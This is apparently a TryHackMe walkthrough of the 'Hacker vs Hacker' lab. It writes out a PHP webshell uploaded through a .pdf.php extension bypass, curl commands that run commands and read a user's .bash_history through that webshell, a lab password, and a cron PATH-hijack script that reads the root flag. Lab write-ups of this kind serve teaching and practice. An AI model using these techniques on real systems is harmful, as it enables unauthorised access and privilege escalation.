# Hacker vs Hacker — TryHackMe Walkthrough

**Room:** Hacker vs Hacker | **Difficulty:** Easy | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | 10.48.139.103 |
| Attack Machine | Kali Linux |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | File upload bypass → RCE via webshell |
| 02 | Cron PATH hijack (malicious pkill script) |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV 10.48.139.103 -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22/tcp | SSH (OpenSSH 8.2p1) |
| 80/tcp | HTTP (Apache 2.4.41) |

---

## Phase 2: File Upload Bypass

The website has a CV upload form. HTML comments reveal a `/cvs/` directory. Accessing `/upload.php` shows the source — the validation uses `strpos()` to check for `.pdf` in the filename.

```php
if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
}
```

Create and upload a PHP webshell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.pdf.php
curl -F "fileToUpload=@shell.pdf.php" http://10.48.139.103/upload.php
```

---

## Phase 3: User Flag

```bash
curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt"
```

**Flag 01 captured.**

---

## Phase 4: SSH Access

Bash history reveals credentials:
```bash
curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history"
```

Password: **thisistheway123**

```bash
ssh lachlan@10.48.139.103
```

*Note: A persistence cron kills SSH sessions every few seconds — use one-shot commands.*

---

## Phase 5: Privilege Escalation — PATH Hijack

The persistence cron has a misconfigured PATH:
```
PATH=/home/lachlan/bin:/bin:/usr/bin
* * * * * root ... && pkill -9 -t pts/$f
```

`pkill` is called without an absolute path, and `/home/lachlan/bin` is writable.

```bash
ssh lachlan@10.48.139.103 \
  'echo "#!/bin/bash
cat /root/root.txt > /home/lachlan/rootflag.txt
chmod 777 /home/lachlan/rootflag.txt" > /home/lachlan/bin/pkill \
  && chmod +x /home/lachlan/bin/pkill'
```

Wait for cron, then:
```bash
ssh lachlan@10.48.139.103 'cat /home/lachlan/rootflag.txt'
```

**Flag 02 captured.**

---

## Vulnerability Chain

1. **Insecure File Upload** — `strpos()` check allows `.pdf.php` bypass
2. **Credential Disclosure** — Bash history exposes password
3. **Cron PATH Hijacking** — `pkill` without absolute path + writable `/home/lachlan/bin` = root RCE

## Key Takeaways

- `strpos()` returning position 0 is falsy — place `.pdf` mid-filename to bypass
- Always check `.bash_history` — previous attackers leave traces
- Cron jobs with relative paths in writable PATH dirs are instant root
